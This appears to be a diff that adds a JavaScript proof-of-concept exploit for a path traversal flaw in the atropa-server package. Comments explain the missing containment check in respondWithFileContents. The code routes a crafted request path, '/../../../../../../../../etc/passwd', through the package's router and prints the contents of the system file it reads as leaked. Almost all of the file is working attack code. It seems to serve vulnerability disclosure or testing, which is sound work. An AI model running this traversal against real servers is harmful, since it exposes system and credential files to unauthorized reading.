@@ -1,0 +1,36 @@
+```javascript
+// Path traversal in atropa-server's respondWithFileContents (requestHandlers.js).
+// router.js builds `location` from serverroot + user-controlled pathname, then
+// calls handle.file() -> respondWithFileContents(), which passes that path
+// straight to fs.readFile() with no containment check, allowing arbitrary
+// file read outside the configured server root.
+
+var fs = require("fs");
+var os = require("os");
+var path = require("path");
+
+// Set up a restricted "web root" that should sandbox served files.
+var webroot = fs.mkdtempSync(path.join(os.tmpdir(), "webroot-"));
+fs.writeFileSync(path.join(webroot, "index.html"), "safe content");
+process.env.serverroot = webroot;
+
+var router = require("atropa-server/router.js");
+var handlers = require("atropa-server/requestHandlers.js");
+
+var fakeResponse = {
+    writeHead: function (statusCode, headers) {
+        console.log("STATUS:", statusCode, headers);
+    },
+    write: function (data) {
+        console.log("LEAKED FILE CONTENTS:\n" + data);
+    },
+    end: function () {}
+};
+
+// Malicious request path traversing out of serverroot to read /etc/passwd.
+var traversal = "/../../../../../../../../etc/passwd";
+var fakeRequest = { url: traversal };
+var parsedUrl = { pathname: traversal };
+
+router.route(handlers, parsedUrl, fakeResponse, fakeRequest);
+```
